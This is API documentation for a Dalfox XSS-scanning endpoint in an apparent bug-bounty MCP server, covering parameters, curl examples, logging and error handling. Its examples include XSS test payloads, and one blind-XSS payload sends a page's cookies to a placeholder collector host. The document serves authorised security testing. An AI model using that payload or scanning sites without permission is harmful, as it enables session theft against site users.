# Dalfox XSS Scanner Tool

This document provides comprehensive information about the Dalfox XSS vulnerability scanning tool endpoint in the Bug Bounty MCP Server.

## Overview

Dalfox is a powerful XSS (Cross-Site Scripting) vulnerability scanner that can be invoked through the REST API. This tool provides comprehensive XSS scanning capabilities with various configuration options for different scanning scenarios.

## API Endpoint

**Path:** `/api/tools/dalfox`
**Method:** `POST`
**Content-Type:** `application/json`

## Parameters

### Required Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `url` | string | Target URL to scan for XSS vulnerabilities |

### Optional Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `pipe_mode` | boolean | `false` | Enable pipe mode for input from stdin |
| `blind` | boolean | `false` | Enable blind XSS scanning |
| `mining_dom` | boolean | `true` | Enable DOM mining for parameter discovery |
| `mining_dict` | boolean | `true` | Enable dictionary-based parameter mining |
| `custom_payload` | string | `""` | Custom XSS payload to use in scanning |
| `workers` | integer | `100` | Number of worker threads for scanning |
| `method` | string | `"GET"` | HTTP method to use (GET, POST, etc.) |
| `headers` | string | `""` | Custom HTTP headers (format: "Header1:Value1;Header2:Value2") |
| `cookies` | string | `""` | Custom cookies to include in requests |
| `timeout` | integer | `10` | Request timeout in seconds |
| `additional_args` | string | `""` | Additional command-line arguments to pass to dalfox |

## Request Format

### Basic Scan
```json
{
    "url": "https://example.com/vulnerable-page"
}
```

### Advanced Scan with Custom Configuration
```json
{
    "url": "https://example.com/vulnerable-page",
    "blind": true,
    "custom_payload": "<script>alert('XSS')</script>",
    "workers": 50,
    "method": "POST",
    "headers": "Authorization:Bearer token123;User-Agent:CustomAgent",
    "cookies": "session=abc123;csrf=xyz789",
    "timeout": 30,
    "additional_args": "--delay 2"
}
```

## Response Format

The endpoint returns a JSON response with the following structure:

```json
{
    "success": true,
    "result": {
        "tool": "dalfox",
        "target": "https://example.com/vulnerable-page",
        "command": "dalfox url https://example.com/vulnerable-page --blind --mining-dom --mining-dict",
        "success": true,
        "stdout": "Dalfox scan output...",
        "stderr": "Any error messages...",
        "return_code": 0,
        "parameters": {
            "url": "https://example.com/vulnerable-page",
            "pipe_mode": false,
            "blind": true,
            "mining_dom": true,
            "mining_dict": true,
            "custom_payload": "",
            "workers": 100,
            "method": "GET",
            "headers": "",
            "cookies": "",
            "timeout": 10,
            "additional_args": ""
        }
    }
}
```

## Curl Examples

### Basic XSS Scan
```bash
curl -X POST http://127.0.0.1:8888/api/tools/dalfox \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://example.com/search?q=test"
  }'
```

### Advanced XSS Scan with Custom Configuration
```bash
curl -X POST http://127.0.0.1:8888/api/tools/dalfox \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://example.com/login",
    "blind": true,
    "method": "POST",
    "headers": "Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    "cookies": "sessionid=abc123def456;csrftoken=xyz789",
    "custom_payload": "<img src=x onerror=alert(1)>",
    "workers": 25,
    "timeout": 45,
    "additional_args": "--silence --delay 3"
  }'
```

### Blind XSS Scan with Custom Payload
```bash
curl -X POST http://127.0.0.1:8888/api/tools/dalfox \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://vulnerable-site.com/feedback",
    "blind": true,
    "mining_dom": false,
    "custom_payload": "<script>fetch(\"https://your-xss-hunter.com/\"+document.cookie)</script>",
    "method": "POST",
    "timeout": 60
  }'
```

## Logging

### Log File Location
Logs for the Dalfox tool are stored in: `/logs/tools.dalfox.dalfox.log`

### Log Format
The logging system uses the following format:
```
%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

Example log entries:
```
2025-09-07 10:30:15,123 - tools.dalfox.dalfox - INFO - Executing Dalfox XSS scan on https://example.com/search
2025-09-07 10:31:45,456 - tools.dalfox.dalfox - INFO - Dalfox XSS scan completed for https://example.com/search
```

### Debug Mode
When the server is running with `DEBUG=true`, more detailed logging information will be available, including:
- Parameter extraction details
- Command construction process
- Execution timing information
- Full command output (stdout/stderr)

## Error Handling

### Common Error Scenarios

1. **Missing URL Parameter**
   - Status: `400 Bad Request`
   - Response: `{"error": "Url is required"}`

2. **Invalid JSON**
   - Status: `400 Bad Request`
   - Response: `{"error": "JSON data is required"}`

3. **Command Execution Failure**
   - Status: `500 Internal Server Error`
   - Response: `{"error": "Server error: <error_message>"}`

4. **Timeout**
   - The scan will timeout after 10 minutes (600 seconds) by default
   - Partial results may be available in the response

## Usage Notes

1. **Performance**: XSS scanning can be resource-intensive. Consider adjusting the `workers` parameter based on your system capabilities.

2. **Timeouts**: Large applications may require longer timeouts. Adjust the `timeout` parameter accordingly.

3. **Authentication**: Use the `headers` and `cookies` parameters to provide authentication tokens when scanning authenticated endpoints.

4. **Custom Payloads**: The `custom_payload` parameter allows you to test specific XSS vectors relevant to your target application.

5. **Blind XSS**: Enable `blind` mode when testing for stored XSS that might not immediately reflect in the response.

6. **Mining Options**: DOM and dictionary mining can help discover additional parameters, but may increase scan time.

## Security Considerations

- Only scan applications you own or have explicit permission to test
- Be mindful of rate limiting and avoid overwhelming target servers
- Consider using appropriate delays with `additional_args` parameter
- Review and validate all scan results manually before reporting vulnerabilities
